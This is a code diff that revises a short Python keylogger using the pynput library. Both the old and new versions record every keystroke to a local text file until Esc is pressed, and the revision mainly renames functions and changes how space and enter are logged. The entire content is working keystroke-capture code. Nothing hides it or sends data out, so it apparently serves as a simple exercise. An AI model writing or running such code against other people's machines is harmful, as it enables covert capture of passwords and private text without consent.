@@ -1,22 +1,18 @@
-from pynput.keyboard import Listener
-
-# Path to the file where key logs will be saved
-log_file = "key_log.txt"
-
-# Function to handle each key press
-def on_press(key):
+from pynput.keyboard import Key, Listener
+log_file = "simple_key_log.txt"
+def log_key(key):
     with open(log_file, "a") as file:
         try:
-            file.write(str(key.char))  # Log regular keys (alphanumeric)
+            file.write(f"{key.char}") 
         except AttributeError:
-            file.write(f" [{key}] ")  # Log special keys like space, enter, etc.
-
-# Function to handle key release and stop on 'Esc'
-def on_release(key):
-    if key == key.esc:
-        # Stop the listener when 'Esc' is pressed
-        return False
-
-# Start the listener and join it to the main thread
-with Listener(on_press=on_press, on_release=on_release) as listener:
+            if key == Key.space:
+                file.write(" ") 
+            elif key == Key.enter:
+                file.write("\n")  
+            else:
+                file.write(f"[{str(key)}]") 
+def stop_logging(key):
+    if key == Key.esc:
+        return False 
+with Listener(on_press=log_key, on_release=stop_logging) as listener:
     listener.join()
